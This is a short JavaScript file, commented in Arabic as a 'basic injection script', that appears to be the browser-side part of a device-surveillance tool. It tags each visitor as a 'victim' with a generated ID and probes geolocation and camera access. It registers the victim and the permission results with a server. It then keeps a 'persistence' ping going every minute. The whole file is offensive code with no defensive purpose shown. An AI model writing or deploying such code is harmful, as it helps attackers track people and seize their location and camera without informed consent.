// سكريبت الحقن الأساسي
function startInjection() {
    // تسجيل الجهاز الضحية
    const victimId = generateId();
    const permissions = {
        geo: false,
        camera: false,
        microphone: false
    };
    
    // محاولة الحصول على الصلاحيات
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            () => { permissions.geo = true },
            () => { permissions.geo = false }
        );
    }
    
    // اختبار الكاميرا
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(() => { permissions.camera = true })
            .catch(() => { permissions.camera = false });
    }
    
    // تسجيل الجهاز
    fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: victimId, permissions })
    });
    
    // إعداد الاتصال المستمر
    setupPersistence(victimId);
}

function generateId() {
    return 'victim-' + Math.random().toString(36).substr(2, 9);
}

function setupPersistence(victimId) {
    // محاولة إعادة الاتصال كل دقيقة
    setInterval(() => {
        fetch('/api/ping', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: victimId })
        });
    }, 60000);
}
